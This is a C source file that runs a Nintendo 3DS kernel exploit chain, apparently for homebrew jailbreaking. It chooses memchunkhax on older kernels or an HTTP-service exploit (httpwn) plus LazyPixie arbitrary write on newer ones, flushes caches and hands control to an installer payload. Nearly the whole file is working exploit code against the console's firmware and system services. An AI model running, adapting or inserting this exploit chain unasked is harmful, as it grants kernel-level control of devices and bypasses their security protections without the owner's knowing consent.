#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include "lib/srv.h"
#include "lib/gsp.h"
#include "httpwn.h"
#include "lazy_pixie.h"
#include "memchunkhax.h"

#include "kernelhaxcode_3ds_bin.h"

typedef struct ExploitChainLayout {
    u8 workBuf[0x10000];
    BlobLayout blobLayout;
} ExploitChainLayout;

static Result doExploitChain(ExploitChainLayout *layout, Handle gspHandle)
{
    Result res = 0;

    Handle handle;
    u32 baseSbufId;
    u32 numSbufs;
    u32 sbufs[16 * 2]; // max allowed by kernel

    memset(layout, 0, sizeof(ExploitChainLayout));
    memcpy(layout->blobLayout.code, kernelhaxcode_3ds_bin, kernelhaxcode_3ds_bin_size);
    khc3dsPrepareL2Table(&layout->blobLayout);

    // Ensure the entire contents of 'layout->blobLayout' are written back into main memory
    TRY(GSPGPU_FlushDataCache(gspHandle, &layout->blobLayout, sizeof(BlobLayout)));

    u8 kernelVersionMinor = KERNEL_VERSION_MINOR;
    if (kernelVersionMinor < 48) {
        // Below 9.3 -- memchunkhax
        TRY(memchunkhax(&layout->blobLayout, layout->workBuf, gspHandle));
    } else {
        // Above 9.3 -- pwn http (target TLS addresses are hard to guess below 4.x) and use LazyPixie
        baseSbufId = 4; // needs to be >= 4
        numSbufs = lazyPixiePrepareStaticBufferDescriptors(sbufs, baseSbufId);
        TRY(httpwn(&handle, baseSbufId, layout->workBuf + 0x1000, layout->workBuf, sbufs, numSbufs, gspHandle));
        TRY(lazyPixieTriggerArbwrite(&layout->blobLayout, handle, baseSbufId));
    }

    // https://developer.arm.com/docs/ddi0360/e/memory-management-unit/hardware-page-table-translation
    // "MPCore hardware page table walks do not cause a read from the level one Unified/Data Cache"
    // Trigger full DCache + L2C flush using this cute little trick (just need to pass a size value higher than the cache size)
    // (but not too high; dcache+l2c size on n3ds is 0x700000; and any non-null userland addr gsp accepts)
    TRY(GSPGPU_FlushDataCache(gspHandle, layout, 0x700000));

    khc3dsLcdDebug(true, 255, 0, 0);
    return khc3dsTakeover("SafeB9SInstaller.bin", 0);
}

Result otherappMain(u32 paramBlk)
{
    Handle gspHandle = **(Handle **)(paramBlk + 0x58);
    ExploitChainLayout *layout = (ExploitChainLayout *)((paramBlk + 0x1000) & ~0xFFF);

    return doExploitChain(layout, gspHandle);
}
